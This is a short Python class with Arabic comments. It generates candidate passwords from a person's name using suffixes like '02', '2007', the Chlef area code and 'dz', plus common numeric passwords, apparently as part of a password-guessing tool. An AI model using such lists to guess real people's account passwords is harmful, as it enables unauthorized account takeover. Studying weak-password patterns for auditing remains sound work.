class MohaSmartLogic:
    """المنطق الذكي لتوليد كلمات السر التي طلبتها (02, 2007, @)"""
    
    @staticmethod
    def get_smart_passwords(name):
        """توليد الكلمات الشهيرة المرتبطة بالاسم"""
        pws = [
            name + name,           # amineamine
            name + "02",           # amine02
            name + "2007",         # amine2007
            name + "@02",          # amine@02
            name + "123",          # amine123
            name + "2024",         # amine2024
            name + "013",          # amine013 (Chlef code)
            "0000" + name,         # 0000amine
            name + "@" + name,     # amine@amine
            "dz" + name            # dzamine
        ]
        # إضافة كلمات سر عامة قوية في الجزائر
        pws.extend(['12345678', '123456789', '123123123', '00000000'])
        return list(set(pws)) # إزالة التكرار

